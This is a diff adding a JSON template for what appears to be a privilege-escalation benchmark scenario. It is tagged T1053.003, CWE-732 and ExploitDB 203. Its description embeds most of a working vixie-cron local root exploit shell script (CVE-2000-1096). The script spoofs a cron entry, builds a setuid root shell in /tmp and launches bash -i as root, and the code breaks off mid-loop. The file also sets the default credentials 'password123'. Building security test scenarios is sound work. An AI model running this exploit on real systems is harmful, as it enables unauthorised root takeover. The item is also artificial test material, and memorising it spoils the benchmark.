@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_203",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: vixie-cron - Local Privilege Escalation (OSVDB-1652;CVE-2000-1096)\n\nExploit source code (203.sh):\n```\n#!/bin/sh\n\necho '.-------------------------------------------------------------------------.'\necho '| Marchew Hyperreal Industries ................... <marchew@dione.ids.pl> |'\necho \"| ( ...well, it is just me, but it is more elite to speak as a group... ) |\"\necho \"\\`--------------------------------- presents ------------------------------'\"\necho\necho '  * another vixie-cron root sploit by Michal Zalewski <lcamtuf@ids.pl> *   '\necho\necho '.-------------------------------------------------------------------------.'\necho '| This time, it is somewhat more complicated. On some systems, it might   |'\necho '| require some tuning, to be slower, but resources-effective. It expects  |'\necho '| root (or other choosen user) to do \"crontab -e\" or \"crontab /any/file\"  |'\necho '| sooner or later, and spoofs the legitimate cron entry file with evil    |'\necho '| content, thus leading to account compromise (usually: root compromise). |'\necho \"\\`-------------------------------------------------------------------------'\"\necho\n\nCYCLES=32768\nDESTUSER=root\nSHOULDTOOK=60\n\nVCRON=\"`strings /usr/bin/crontab 2>/dev/null|grep -i vixie`\"\n\nif [ \"$VCRON\" = \"\" ]; then\n  echo \"[-] Sorry, this box is not running vixie cron.\"\n  echo\n  exit 1\nelse\n  echo \"[+] Found Paul Vixie's /usr/bin/crontab utility.\"\nfi\n\n\nif [ -r /var/spool/cron ]; then\n  echo \"[+] This box has exploitable /var/spool/cron...\"\nelse\n  echo \"[-] Sorry, this box is not vulnerable to this attack.\"\n  echo\n  exit 1\nfi\n\n\nif [ -u /usr/bin/crontab ]; then\n  echo \"[+] This box has setuid crontab utility...\"\nelse\n  echo \"[-] Sorry, this box has no setuid crontab.\"\n  echo\n  exit 1\nfi\n\ncat >dowrite.c <<_EOF_\nmain() {\n  lseek(1,0,0);\n  write(1,\"* * * * * /tmp/.rootcron\\n\\n\",26);\n  ftruncate(1,25);\n}\n_EOF_\n\necho \"[+] Compiling helper application #1...\"\n\ngcc -o dowrite dowrite.c\n\nif [ ! -f dowrite ]; then\n  echo \"[-] Compilation failed.\"\n  echo\n  exit 1\nfi\n\necho \"[+] Application #1 compiled successfully.\"\n\necho \"[+] Creating helper application #2...\"\n\ncat >/tmp/.rootcron <<_EOF_\n#!/bin/sh\n\n(\n  chown root.root /tmp/.r00tcr0n\n  chmod 6755 /tmp/.r00tcr0n\n  rm -f /var/spool/cron/tmp.*\n  crontab -r\n) &>/dev/null\n\n_EOF_\n\ncat >root.c <<_EOF_\nmain() {\n  setuid(0); setgid(0);\n  unlink(\"/tmp/.r00tcr0n\");\n  execl(\"/bin/bash\",\"bash\",\"-i\",0);\n  perror(\"bash\");\n}\n_EOF_\n\necho \"[+] Compiling helper application #3...\"\n\ngcc -o /tmp/.r00tcr0n root.c\n\nif [ ! -f /tmp/.r00tcr0n ]; then\n  echo \"[-] Compilation failed.\"\n  echo\n  exit 1\nfi\n\necho \"[+] Application #3 compiled successfully.\"\n\n\nX=0\n\n\nif [ ! \"$1\" = \"noprep\" ]; then\n\n  echo \"[*] Attack against user $DESTUSER, doing $CYCLES setup cycles...\"\n  echo \"    Please be patient, setup might took some time; to skip it if\"\n  echo \"    /var/spool/cron on this machine is already initialized, use\"\n  echo \"    '$0 noprep'.\"\n\n  PROB=$[CYCLES*100/32768]\n  test \"$PROB\" -gt \"100\" && PROB=100\n\n  echo \"[+] This gives almost $PROB% probability of success on the first attempt.\"\n\n  while [ \"$X\" -lt \"$CYCLES\" ]; do\n```",
+  "cve": "OSVDB-1652;CVE-2000-1096",
+  "exploitdb_id": "203",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_203",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
